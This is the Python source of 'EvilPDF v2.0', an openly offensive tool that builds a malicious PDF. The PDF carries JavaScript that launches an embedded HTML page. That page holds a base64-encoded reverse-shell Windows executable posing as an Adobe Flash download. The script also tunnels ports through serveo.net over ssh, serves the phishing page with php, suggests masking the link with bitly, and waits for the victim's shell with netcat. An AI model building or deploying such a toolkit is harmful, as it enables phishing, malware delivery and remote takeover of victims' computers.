#!/bin/bash
# EvilPDF v2.0
# coded by: @linux_choice
# modified by : ghosthub (b@b@y)
# 

import os, time, signal, sys
from random import randint

from PyPDF2 import PdfFileWriter, PdfFileReader


try:
    input = raw_input
except NameError:
    pass


def dependencies():

 os.system('command -v base64 > /dev/null 2>&1 || { echo >&2 "Install base64"; }')
 os.system('command -v zip > /dev/null 2>&1 || { echo >&2 "Install zip"; }')
 os.system('command -v netcat > /dev/null 2>&1 || { echo >&2 "Install netcat"; }')
 os.system('command -v php > /dev/null 2>&1 || { echo >&2 "Install php"; }')
 os.system('command -v ssh > /dev/null 2>&1 || { echo >&2 "Install ssh"; }')
 os.system('command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "Install mingw-w64"; }')


def shutdown(signal,frame):
  print ("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
  os.system('killall -9 php > /dev/null 2>&1')
  os.system('killall -9 ssh > /dev/null 2>&1')
  sys.exit()
signal.signal(signal.SIGINT, shutdown)

def create_pdf(url,pdf_name):

 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Generating PDF file...\033[0m\n")
 time.sleep(2)
 if pdf_name == "":
   pdf_name=open('adobe.pdf', 'rb')
 unmeta=PdfFileReader("%s" % (pdf_name), "rb")
 meta=PdfFileWriter()
 meta.appendPagesFromReader(unmeta)
 meta.addJS('this.exportDataObject({ cName: "page.html", nLaunch: 2 });')
 with open("page.html", "rb") as fp:
     print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Attaching page.html to PDF...\033[0m\n")
     meta.addAttachment("page.html", fp.read())

     
 with open("%s" % (pdf_name), "wb") as fp:
   meta.write(fp)


 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Converting PDF file to base64\033[0m\n")
 time.sleep(2)
 os.system('base64 -w 0 %s > b64' % (pdf_name))
 with open ("b64", 'r') as get_b64:
   data=get_b64.read().strip()

 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Injecting Data URI (base64) code into index.html\033[0m\n")
 time.sleep(2)
 os.system("sed 's+url_website+'%s'+g' template.html | sed 's+payload_name.zip+'%s'+g'  > index.html" % (url,pdf_name))

 f = open("index.html", 'r')
 filedata = f.read()
 f.close()
 newdata = filedata.replace("data_base64", "%s" % (data))

 f=open("index.html", 'w')
 f.write(newdata)
 f.close()


def banner():
 print( "\n")
 print( " \033[1;31m___________     .__.__ \033[1;93m__________________  ___________ \033[0m")
 print( " \033[1;31m\_   _____/__  _|__|  |\033[1;93m\______   \______ \ \_   _____/ \033[0m")
 print( " \033[1;31m |    __)_\  \/ /  |  |\033[1;93m |     ___/|    |  \ |    __)   \033[0m")
 print( " \033[1;77m |        \\\\   /|  |  |_|    |    |    `   \|     \    \033[0m")
 print( " \033[1;77m/_______  / \_/ |__|____/____|   /_______  /\___  /    \033[0m")
 print( " \033[1;77m        \/                               \/     \/     \033[0m")
 print( " \033[1;77mv2.0 modified by ~ Ghosthub\n")
 print( " \033[1;77mgithub.com/Ba-hub/evilpdf\033[0m\n")


def server(subdomain_resp,subdomain,default_port1):


 print ("\033[1;77m[\033[0m\033[1;93m+\033[0m\033[1;77m] Starting Serveo...\033[0m\n")

 os.system('killall -2 php > /dev/null 2>&1')
 os.system('killall -9 ssh > /dev/null 2>&1')


 if subdomain_resp == True:

    os.system("$(which sh) -c \'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R \'%s\':80:localhost:3333 serveo.net -R \'%s\':localhost:4444 2> /dev/null > sendlink ' &" % (subdomain,default_port1))
    print( "\033[1;77m[\033[0m\033[1;31m+\033[0m\033[1;77m]\033[0m\033[1;31m TCP Forwarding:\033[0m\033[1;77m serveo.net:{}/\033[0m\n").format(default_port1)
    time.sleep(8)
 else:
    os.system("$(which sh) -c \'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R \'%s\':localhost:4444 2> /dev/null > sendlink \' &" % (default_port1))
    print( "\033[1;77m[\033[0m\033[1;31m+\033[0m\033[1;77m]\033[0m\033[1;31m TCP Forwarding:\033[0m\033[1;77m serveo.net:{}/\033[0m\n").format(default_port1)

 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting php server... (localhost:3333)\033[0m\n")
 os.system("fuser -k 3333/tcp > /dev/null 2>&1")
 os.system("php -S localhost:3333 > /dev/null 2>&1 &")
 time.sleep(6)
 print( '\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] Direct link:\033[0m\033[1;77m\n')
 os.system("grep -o \"https://[0-9a-z]*\.serveo.net\" sendlink")
 print( '\n\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] Obfuscation URL use bitly.com (insert above link without https)\033[0m\n')



def listener():

  print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listening connection:\033[0m\n")
  os.system("fuser -k 4444/tcp > /dev/null 2>&1")
  os.system("nc -lvp 4444")


def payload(payload_name,pdf_name,url,default_port1):

 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Building malware binary\033[0m\n")
 time.sleep(2)
 os.system("sed 's+serveo_port+'%s'+g'  source.c > rs.c" % (default_port1))
 os.system("i686-w64-mingw32-gcc rs.c -o %s.exe" % payload_name)
 os.system('zip %s.zip %s.exe > /dev/null 2>&1' % (payload_name,payload_name))
 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Converting malware binary to base64\033[0m\n")
 time.sleep(2)
 os.system('base64 -w 0 %s.zip > b64' % (payload_name))
 with open ("b64", 'r') as get_b64:
   data=get_b64.read().strip()

 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Injecting Data URI (base64) code into page.html\033[0m\n")
 time.sleep(2)
 os.system("sed 's+url_website+'%s'+g' template.html | sed 's+payload_name+'%s'+g'  > page.html" % (url,payload_name))

 f = open("page.html", 'r')
 filedata = f.read()
 f.close()
 newdata = filedata.replace("data_base64", "%s" % (data))

 f=open("page.html", 'w')
 f.write(newdata)
 f.close()
 create_pdf(url,pdf_name)


def start():

 pdf_default="adobe.pdf"
 pdf_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] PDF path (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (pdf_default))
 exists = os.path.isfile(pdf_name)

 if pdf_name == "":
   pdf_name=pdf_default

 elif not exists:
  print('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] File Not Found! \033[0m')
  sys.exit()


 name_default="getadobe"
 payload_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Exe file name (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (name_default))
 if payload_name == "":
   payload_name=name_default
 url_default="https://get.adobe.com/flashplayer/download"
 url=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Phishing URL (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (url_default))
 if url == "":
   url=url_default
 default_port=randint(1000,65000)
 default_port1=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Serveo (Forwarding) Port (Default:\033[0m\033[1;77m %d \033[0m\033[1;33m): \033[0m' % (default_port))
 if default_port1 == '':
   default_port1=default_port

 choose_sub=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Choose subdomain? \033[0m\033[1;77m [Y/n] \033[0m\033[1;33m: \033[0m')


 if choose_sub in "Yy":

   subdomain_resp=True
   default_subdomain="getadobe"+str(randint(100,400))
   subdomain=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Subdomain: (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (default_subdomain))
   if subdomain == "":
      subdomain=default_subdomain
 
 else:
    subdomain_resp=False
    subdomain=""
 payload(payload_name,pdf_name,url,default_port1)
 server(subdomain_resp,subdomain,default_port1)
 listener()

banner()
dependencies()
start()

